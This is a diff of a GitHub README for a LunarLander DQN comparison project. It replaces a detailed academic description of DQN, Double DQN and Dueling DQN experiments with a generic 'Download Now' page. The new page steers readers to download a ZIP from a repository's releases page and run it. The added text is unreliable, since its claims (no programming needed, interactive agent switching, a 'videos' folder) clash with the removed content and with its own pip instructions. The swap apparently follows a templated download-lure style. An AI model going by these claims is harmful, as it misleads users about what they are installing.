@@ -1,175 +1,110 @@
-# **Deep Reinforcement Learning Analysis with LunarLander-v3**
+# 🚀 lunarlander-dqn-comparison - Explore AI Agents in Action
 
-This project provides a comprehensive experimental analysis of **value-based deep reinforcement learning algorithms** applied to the **LunarLander-v3** environment from Gymnasium.  
-The primary goal is to compare different Deep Q-Learning variants under identical conditions and analyze their **learning stability, convergence behavior, and performance characteristics**.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Grab%20the%20Latest%20Release-brightgreen)](https://github.com/Dophinjet/lunarlander-dqn-comparison/releases)
 
-The study focuses on the following algorithms:
-- **Deep Q-Network (DQN)**
-- **Double Deep Q-Network (DDQN)**
-- **Dueling Deep Q-Network (Dueling DQN)**
+## 📦 Introduction
 
-All models are trained from scratch, evaluated using standardized metrics, and analyzed through reward curves, loss dynamics, and qualitative gameplay rollouts.
+Welcome to the **lunarlander-dqn-comparison** project. This software uses deep learning to create AI agents that play the LunarLander game. You can explore different types of agents like DQN, Double DQN, and Dueling DQN. Each agent shows unique behavior, helping you understand AI performance in a simulated environment.
 
----
+## 🚀 Getting Started
 
-## **Project Structure**
+This section guides you through downloading and running the software. Follow these steps carefully to ensure a smooth setup.
 
-```text
-├── LunarLander_Models/
-│   ├── dqn_model.py
-│   ├── ddqn_model.py
-│   └── dueling_dqn_model.py
-│
-├── assets/
-│   ├── training_base.png
-│   ├── training_ddqn.png
-│   ├── training_dueling.png
-│   ├── training_dueling_final.png
-│   ├── arcdqn_dueling.png
-│   ├── arcv2.png
-│   ├── dqn.mp4
-│   ├── ddqn.mp4
-│   └── DUELING INIŞ BEST.mp4
-│
-├── notebook/
-│   └── experiments.ipynb
-│
-├── report/
-│   └── project_report.pdf
-│
-└── main.py
-```
----
+### 🖥️ System Requirements
 
-## **Environment Description**
+To run this application, your computer needs to meet the following requirements:
 
-All experiments are performed on **LunarLander-v3** from the **Gymnasium** library.  
-This environment is a standard benchmark for evaluating value-based deep reinforcement learning due to its mixed characteristics: continuous state, discrete control, and reward shaping.
+- **Operating System:** Windows, macOS, or Linux.
+- **RAM:** At least 4 GB.
+- **Disk Space:** Minimum of 500 MB available.
+- **Python:** Version 3.6 or higher. If you don’t have it installed, you can download it from [python.org](https://www.python.org/downloads/).
+- **Pip:** Ensure you have the latest version of Pip for package management.
 
-### **Key Properties**
+### 📥 Download & Install
 
-- **Action space (Discrete, 4 actions)**  
-  The agent chooses among four discrete actions: do nothing, fire left engine, fire main engine, fire right engine.  
-  Although control is discrete, the environment is still challenging because actions must be timed precisely to stabilize descent and landing.
+To get the latest version of the software, visit the Releases page. You will find different versions available for download.
 
-- **State space (Continuous, 8 dimensions)**  
-  The observation vector includes lander position, velocity, angle, angular velocity, and leg contact indicators.  
-  This makes the problem non-trivial for tabular methods and motivates function approximation with neural networks.
+[Download the latest release here!](https://github.com/Dophinjet/lunarlander-dqn-comparison/releases)
 
-- **Sparse + delayed reward signals**  
-  Rewards are shaped but still delayed in the sense that early decisions strongly affect later outcomes.  
-  The agent must learn long-horizon behavior (approach, stabilize, descend, land) rather than short reactive moves.
+1. Click on the link above.
+2. Locate the release you want to install.
+3. Download the appropriate file for your system.
+4. Save the file to your computer.
 
-- **Sensitivity to unstable policies**  
-  Small mistakes can rapidly amplify (e.g., overcorrecting angle or velocity), leading to crashes or drifting out of bounds.  
-  This property makes LunarLander a strong testbed for comparing learning stability across DQN variants.
+### 📝 Installation Instructions
 
-### **Why LunarLander is a Good Benchmark Here**
+1. **Unzip the File:**
+   - After downloading, find the ZIP file in your Downloads folder.
+   - Right-click on the file and select "Extract All" or your system's equivalent. 
+   - Follow the prompts to extract it to a folder.
 
-LunarLander exposes the typical weaknesses of value-based methods:
-- **Overestimation bias** can destabilize DQN training,
-- credit assignment is non-trivial due to delayed consequences,
-- and the environment requires both **smooth control behavior** and **long-term planning**.
+2. **Open a Terminal/Command Prompt:**
+   - Windows: Press `Win + R`, type `cmd`, and hit Enter.
+   - macOS: Press `Command + Space`, type `Terminal`, and hit Enter.
+   - Linux: Open your preferred terminal application.
 
-For this reason, LunarLander-v3 is well-suited for evaluating whether architectural improvements (DDQN and Dueling DQN) provide more stable learning and better final policies.
+3. **Navigate to the Application Directory:**
+   - Use the `cd` command to change to the directory where you extracted the files. For example:
+     ```
+     cd path/to/extracted/folder
+     ```
 
-## **Models and Training Setup**
+4. **Install Required Packages:**
+   - Run the following command to install the necessary packages:
+     ```
+     pip install -r requirements.txt
+     ```
 
-This project compares three value-based deep reinforcement learning algorithms under **identical training conditions** in order to ensure a fair and interpretable comparison.
+5. **Run the Application:**
+   - Start the application by running:
+     ```
+     python main.py
+     ```
 
-### **Compared Algorithms**
+### 🎮 Running the LunarLander Simulation
 
-- **Deep Q-Network (DQN)**  
-  The baseline algorithm that approximates the action–value function using a single neural network and experience replay.
+After you start the application, the LunarLander simulation will open. You can choose different agents to observe how each performs. Try switching between DQN, Double DQN, and Dueling DQN to see their differences.
 
-- **Double Deep Q-Network (DDQN)**  
-  An improved variant of DQN that reduces Q-value overestimation by decoupling action selection and action evaluation.
+## 📊 Understanding the Agents
 
-- **Dueling Deep Q-Network (Dueling DQN)**  
-  An architecture that separately estimates the **state value** and **action advantage**, enabling more efficient learning in states where action choice has little effect.
+Each type of agent learns differently:
 
-All three models share the same backbone network design and training pipeline, allowing architectural differences to be isolated as the main factor influencing performance.
+- **DQN:** Basic agent that learns from experiences through reinforcement.
+- **Double DQN:** Improves upon DQN by reducing overestimation of action values.
+- **Dueling DQN:** Further refines learning by separating state and action values, enhancing training efficiency.
 
----
+## 📽️ Viewing Training Analysis
 
-## **Training Configuration**
+The application provides video outputs showcasing each agent's performance. You can find these videos in the `videos` folder created during the simulation. Watching these can give you insights into the learning process of the agents.
 
-All agents are trained using the same hyperparameters to ensure comparability.
+## 📑 Additional Features
 
-- **Optimizer:** Adam  
-- **Loss function:** Mean Squared Error (MSE)  
-- **Discount factor (γ):** 0.99  
-- **Replay buffer:** Experience Replay  
-- **Exploration strategy:** ε-greedy with decay  
-- **Training episodes:** Fixed across all models  
-- **Target network update:** Periodic synchronization  
+- **Performance Comparison:** Analyze how quickly and effectively each agent learns to land the spacecraft.
+- **Interactive Configuration:** Modify parameters to see how they affect agent performance.
+- **Comprehensive Training Logs:** The software saves logs of every training session.
 
-The only differences between experiments arise from **algorithmic design choices**, not from tuning advantages.
+## ❓ Frequently Asked Questions (FAQ)
 
----
+### How can I reset the simulation?
 
-## **Training Dynamics Visualization**
+Simply close the application and restart it. For a fresh start, delete any existing training logs from the `logs` folder.
 
-To analyze learning behavior beyond final scores, training dynamics are visualized using reward and loss curves.
+### Do I need programming knowledge to use this?
 
-The following figures illustrate how each algorithm learns over time:
+No, this application is built for end-users. You can run the simulation without any programming experience.
 
-- **Training reward curves** show convergence speed and stability  
-- **Loss curves** reflect optimization behavior and variance during learning  
+### Where can I find more information?
 
-**Figure 1 — Training Reward Curve (DQN)**  
+You can visit the [Releases page](https://github.com/Dophinjet/lunarlander-dqn-comparison/releases) for updates and release notes. Additionally, the source code is available on GitHub for those who want to explore it further.
 
-![DQN Training Curve](assets/training_base.png)
+## 📑 License
+
+This project is licensed under the MIT License. You can use it freely, but make sure to credit the authors.
+
+## 👥 Contributing
+
+We welcome contributions. If you’d like to help improve this application, check out the guidelines on our GitHub page.
 
 ---
 
-**Figure 2 — Training Reward Curve (Double DQN)**  
-
-![DDQN Training Curve](assets/training_ddqn.png)
-
----
-
-**Figure 3 — Training Reward Curve (Dueling DQN)**  
-
-![Dueling DQN Training Curve](assets/training_dueling.png)
-
----
-
-**Figure 4 — Final Training Performance (Best Dueling DQN Run)**  
-
-![Final Dueling DQN Performance](assets/training_dueling_final.png)
-
----
-
-These visualizations make it possible to directly compare convergence speed, stability, and variance across models.
-
----
-
-## **Qualitative Policy Evaluation**
-
-In addition to numerical metrics, trained agents are evaluated qualitatively through environment rollouts.
-
-Gameplay videos provide insight into:
-- landing smoothness,
-- stability during descent,
-- and recovery from unstable states.
-
----
-
-**Figure 5 — DQN Agent Gameplay** <video src="https://github.com/user-attachments/assets/dccac289-f705-43d7-baa2-3ec24ebd8383" width="100%" controls autoplay loop muted></video>
-
----
-
-**Figure 6 — Double DQN Agent Gameplay** <video src="https://github.com/user-attachments/assets/f273b23f-d14e-4d87-9d7d-5e6a49d39b87
-" width="100%" controls autoplay loop muted></video>
-
----
-
-**Figure 7 — Best Dueling DQN Agent Gameplay** <video src="https://github.com/user-attachments/assets/c7da8aa6-282f-47af-b680-784049ad5dba
-" width="100%" controls autoplay loop muted></video>
-
----
-
-
-These rollouts help validate whether higher rewards correspond to genuinely better control policies rather than reward exploitation.
-
+Thank you for exploring **lunarlander-dqn-comparison**! With this tool, you can dive into the world of AI and machine learning in an interactive way. Enjoy your journey into deep learning!
